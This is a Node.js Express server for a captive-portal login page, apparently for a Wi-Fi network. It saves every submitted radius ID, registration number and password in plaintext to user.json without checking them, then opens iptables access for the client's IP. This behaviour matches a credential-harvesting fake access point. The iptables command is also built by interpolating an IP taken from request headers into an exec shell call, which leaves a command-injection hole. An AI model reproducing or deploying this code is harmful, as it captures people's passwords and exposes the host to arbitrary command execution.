
const port_http = 80;
const port_https = 443;
const codeRedirect = 307;

//Frame
const express = require('express')
const path = require('path')
const app = express()
const fs = require('fs');
const http = require('http');
const https = require('node:https');
const requestIp = require('request-ip')
const { exec } = require('child_process');

//App use
app.use('/public', express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.redirect(codeRedirect, "/Login")
})

app.get('/Login', (req, res) => {

  res.render('index');
})

function savePersonToPublicFolder(person, callback) {
  let data = [];

  try {
    data = JSON.parse(fs.readFileSync('user.json'));
  } catch (error) {
    console.error('Erro ao ler o arquivo JSON:', error);
  }

  data.push(person);

  fs.writeFile('./user.json', JSON.stringify(data, null, 2), callback);
}

app.post('/Login', (req, res) => {

  let Redius = req.body.radiu;
  let Matricula = req.body.Matricula;
  let Senha = req.body.Senha;

  let Data = {
    Redius: Redius,
    Metricula: Matricula,
    senha: Senha
  }

  savePersonToPublicFolder(Data, function (err) {
    if (err) {
      res.status(404).send('User not saved');
      return;
    }

    res.redirect('/Comcluido');
  });



})

async function SendComando(clientIp) {

  try {
    const Comando = `iptables -t nat -I PREROUTING 1 -s ${clientIp} -j ACCEPT`;
    console.log(Comando)

    exec(Comando, (err, stdout, stderr) => {
      if (err) {
        console.error(err)
      } else {
        console.log(`Acesso ip tables liberado para ${clientIp}`);
      }
    });

    return true;
  } catch (err) {
    return false
  }

}

app.get('/Comcluido', async (req, res) => {

  var clientIp = requestIp.getClientIp(req)
  let ip = clientIp.replace(/^::ffff:/, '')
  await SendComando(ip)
  res.render('final');
})

app.use((req, res) => {
  res.redirect(codeRedirect, "/Login")
})

const Key = fs.readFileSync('ssl/code.key');
const Cert = fs.readFileSync('ssl/code.crt');
const Ca = fs.readFileSync('ssl/code.csr');

const credentials = { key: Key, cert: Cert, ca: Ca };

const httpServer = http.createServer(app);
httpServer.listen(port_http);

const httpsServer = https.createServer(credentials, app);
httpsServer.listen(port_https);
